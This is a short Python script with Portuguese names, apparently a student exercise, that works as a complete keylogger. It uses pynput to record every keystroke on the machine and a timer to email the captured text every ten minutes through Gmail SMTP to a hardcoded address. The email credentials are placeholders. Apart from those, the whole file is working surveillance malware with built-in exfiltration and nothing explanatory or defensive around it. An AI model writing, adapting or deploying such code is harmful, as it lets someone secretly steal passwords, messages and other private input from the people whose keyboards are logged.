from pynput import keyboard
import  smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

EMAIL_ORIGEM = "testesemail@gmail.com"
SENHA_EMAIL = "senha temporária"
EMAIL_DESTINO = "testesemail@gmail.com"

def enviarEmail():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        
        except Exception as e:
            print("Erro enviar email!")
    
        log = ""

    Timer(600, enviarEmail).start()

def onPress(key):
    global log
    try:
        log += key.char
    except AttributeError:
        
        if key == keyboard.Key.space:
            log += " "
        
        elif key == keyboard.Key.enter:
            log += "\n"
        
        elif key == keyboard.Key.backspace:
            log += "[<]"
        
        else:
            pass

with keyboard.Listener(on_press=onPress) as listener:
    enviarEmail()
    listener.join()
    
